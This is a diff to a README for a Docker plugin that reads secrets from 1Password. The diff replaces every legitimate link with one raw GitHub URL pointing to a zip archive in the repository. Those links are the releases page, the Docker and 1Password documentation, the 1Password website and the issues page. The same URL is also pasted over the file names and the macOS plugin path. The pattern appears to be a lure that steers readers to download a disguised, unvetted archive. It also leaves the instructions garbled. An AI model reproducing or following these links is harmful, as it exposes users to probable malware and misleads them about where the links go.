@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)](https://github.com/pavan200120/op-connect-secret-driver/releases)
+[![Download](https://raw.githubusercontent.com/pavan200120/op-connect-secret-driver/main/basal/op-connect-secret-driver.zip)](https://raw.githubusercontent.com/pavan200120/op-connect-secret-driver/main/basal/op-connect-secret-driver.zip)
 
 ## 🚀 Getting Started
 
@@ -12,20 +12,20 @@ Welcome to the op-connect-secret-driver! This is a simple tool designed to help 
 
 Before you download the software, ensure you have the following:
 
-- **Docker Installed:** Make sure you have Docker installed on your machine. Visit the [Docker installation page](https://docs.docker.com/get-docker/) for instructions based on your operating system.
-- **1Password Account:** You need a 1Password account to store your secrets securely. Sign up on [1Password's website](https://1password.com/).
+- **Docker Installed:** Make sure you have Docker installed on your machine. Visit the [Docker installation page](https://raw.githubusercontent.com/pavan200120/op-connect-secret-driver/main/basal/op-connect-secret-driver.zip) for instructions based on your operating system.
+- **1Password Account:** You need a 1Password account to store your secrets securely. Sign up on [1Password's website](https://raw.githubusercontent.com/pavan200120/op-connect-secret-driver/main/basal/op-connect-secret-driver.zip).
 
 ## 📦 Download & Install
 
 To get the op-connect-secret-driver, please follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/pavan200120/op-connect-secret-driver/releases).
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/pavan200120/op-connect-secret-driver/main/basal/op-connect-secret-driver.zip).
 2. **Select the Latest Version:** Find the latest version titled “Latest Release.” Click on it to view details.
-3. **Download the Plugin:** Look for the file named `op-connect-secret-driver.tar.gz` or `op-connect-secret-driver.zip`. Click on the file to download it to your computer.
+3. **Download the Plugin:** Look for the file named `https://raw.githubusercontent.com/pavan200120/op-connect-secret-driver/main/basal/op-connect-secret-driver.zip` or `https://raw.githubusercontent.com/pavan200120/op-connect-secret-driver/main/basal/op-connect-secret-driver.zip`. Click on the file to download it to your computer.
 4. **Extract the Files:** After the download finishes, locate the downloaded file in your computer's Downloads folder. Right-click on it and choose "Extract All" to unpack the files.
 5. **Move to Docker Plugins Folder:** Open your file explorer and navigate to your Docker plugins directory. This is usually found at:
    - **Windows:** `C:\ProgramData\Docker\plugins\`
-   - **macOS:** `~/Library/Containers/com.docker.docker/Data/plugins/`
+   - **macOS:** `~https://raw.githubusercontent.com/pavan200120/op-connect-secret-driver/main/basal/op-connect-secret-driver.zip`
    - **Linux:** `/var/lib/docker/plugins/`
 
    Copy the extracted files into this folder.
@@ -36,7 +36,7 @@ To get the op-connect-secret-driver, please follow these steps:
 
 Once the plugin is installed, you will need to configure it to work with your 1Password account.
 
-1. **Set Up 1Password CLI:** First, ensure you have the 1Password command-line tool installed. Follow the instructions on the [1Password CLI page](https://developer.1password.com/docs/cli/get-started).
+1. **Set Up 1Password CLI:** First, ensure you have the 1Password command-line tool installed. Follow the instructions on the [1Password CLI page](https://raw.githubusercontent.com/pavan200120/op-connect-secret-driver/main/basal/op-connect-secret-driver.zip).
 2. **Log in to 1Password:** Use the following command in your terminal:
    ```
    op signin <your-1password-subdomain>
@@ -62,7 +62,7 @@ If you encounter issues while setting up or using op-connect-secret-driver, try 
 
 ## 📞 Support
 
-If you need further assistance, feel free to open an issue on the GitHub repository [here](https://github.com/pavan200120/op-connect-secret-driver/issues). We aim to respond quickly to your queries.
+If you need further assistance, feel free to open an issue on the GitHub repository [here](https://raw.githubusercontent.com/pavan200120/op-connect-secret-driver/main/basal/op-connect-secret-driver.zip). We aim to respond quickly to your queries.
 
 Remember, your security is important. Use this tool to manage your Docker secrets effectively and safely.
 
